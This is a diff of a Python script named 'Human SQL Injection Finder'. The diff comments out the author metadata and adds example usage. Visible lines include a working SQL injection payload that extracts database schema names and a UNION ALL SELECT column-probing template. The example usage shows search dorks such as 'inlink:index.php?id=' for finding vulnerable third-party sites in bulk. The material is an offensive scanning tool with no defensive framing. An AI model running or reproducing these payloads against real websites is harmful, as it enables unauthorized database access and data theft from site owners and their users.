@@ -7,10 +7,11 @@ from bs4 import BeautifulSoup
 requests.packages.urllib3.disable_warnings()
 
 
-__author__      = "Jevil36239"
-__github__      = "github.com/Jevil36239"
-__Finished__    = "12 - Mei - 2023"
-__name__        = "Human SQL Injection Finder"
+#__author__      = "Jevil36239"
+#__github__      = "github.com/Jevil36239"
+#__Finished__    = "12 - Mei - 2023"
+#__name__        = "Human SQL Injection Finder"
+
 
 sqli_payload = """)'XOR(ifnull(CAST(MID((IFNULL(CAST(schema_name%20AS%20CHAR),0x20)),1,62) AS BINARY),0x20)=0)OR('"""
 
@@ -138,3 +139,7 @@ def main():
 
 if __name__ == '__main__':
     main()
+
+# example usage: python sql_injection_finder.py "inlink:index.php?id=" "inlink:gallery.php?id=" --limit 5
+# payload = f"' UNION ALL SELECT {','.join(['NULL']*nomor_coloums)}#" 
+ 
